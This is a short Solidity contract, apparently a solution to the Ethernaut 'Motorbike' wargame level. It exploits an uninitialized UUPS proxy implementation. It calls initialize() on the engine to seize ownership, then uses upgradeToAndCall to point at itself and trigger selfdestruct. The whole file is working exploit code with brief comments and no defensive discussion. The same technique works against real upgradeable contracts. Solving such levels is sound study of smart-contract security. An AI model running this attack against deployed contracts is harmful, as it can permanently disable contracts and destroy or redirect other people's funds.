pragma solidity <0.7.0;

contract MotorbikeAttack {

    function attack(address engine) public {
        // motorbike constructor calls initialize with delegatecall,
        // so engine's storage reads initialized false
        engine.call(abi.encodeWithSignature("initialize()"));

        // "upgrade" implementation to this contract and call destroy
        bytes memory fnsig = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)", 
            address(this),
            abi.encodeWithSignature("destroy()")
        );
        engine.call(fnsig);
    }

    function destroy() public {
        selfdestruct(tx.origin);
    }

}
